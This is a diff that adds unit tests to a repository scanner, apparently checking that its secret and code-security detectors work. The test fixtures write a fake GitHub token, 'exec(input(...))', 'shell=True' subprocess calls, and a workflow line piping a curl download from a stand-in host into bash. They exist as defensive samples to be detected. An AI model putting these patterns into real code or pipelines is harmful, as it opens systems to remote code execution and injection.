@@ -345,6 +345,39 @@ class OneHealthScannerTests(unittest.TestCase):
         report = scan_repository(self.root)
         self.assertTrue(any(f["rule_id"] == "missing-core-cli-command" for f in report["findings"]))
 
+    def test_security_detector_flags_secret_without_disclosing_value(self):
+        fake_secret = "ghp_" + ("A" * 36)
+        self.write("config.py", "TOKEN = " + repr(fake_secret) + "\\n")
+        report = scan_repository(self.root)
+        finding = next(f for f in report["findings"] if f["rule_id"] == "github-token")
+        self.assertEqual("critical", finding["severity"])
+        self.assertNotIn(fake_secret, json.dumps(finding))
+        self.assertIn("matched_value_redacted=true", finding["evidence"])
+
+    def test_security_detector_ignores_environment_references_and_placeholders(self):
+        self.write("config.py", "api_key = \"\${API_KEY}\"\\npassword = \"your_password_here\"\\n")
+        report = scan_repository(self.root)
+        self.assertFalse(any(f["detector_id"] == "security-secrets" for f in report["findings"]))
+
+    def test_security_detector_flags_suspicious_code_and_workflow_patterns(self):
+        code = "exec" + "(input" + "('command'))"
+        self.write("unsafe.py", code + "\\nsubprocess.run(command, shell=True)\\n")
+        workflow = "name: unsafe\\npermissions:\\n  write-all\\nsteps:\\n  - uses: vendor/action@main\\n  - run: curl https://example.invalid/script.sh | bash\\n"
+        self.write(".github/workflows/unsafe.yml", workflow)
+        report = scan_repository(self.root)
+        rules = {f["rule_id"] for f in report["findings"]}
+        self.assertIn("dynamic-eval-of-input", rules)
+        self.assertIn("subprocess-shell-true", rules)
+        self.assertIn("write-all-permissions", rules)
+        self.assertIn("mutable-action-ref", rules)
+        self.assertIn("pipe-to-shell", rules)
+
+    def test_security_detectors_are_declared_in_coverage(self):
+        self.write("sample.py", "value = 1\\n")
+        report = scan_repository(self.root)
+        self.assertIn("security-secrets", report["detectors_run"])
+        self.assertIn("security-code", report["detectors_run"])
+
     def test_json_report_schema_and_counts_are_present(self):
         self.write("README.md", "Healthy.\n")
         report = scan_repository(self.root)
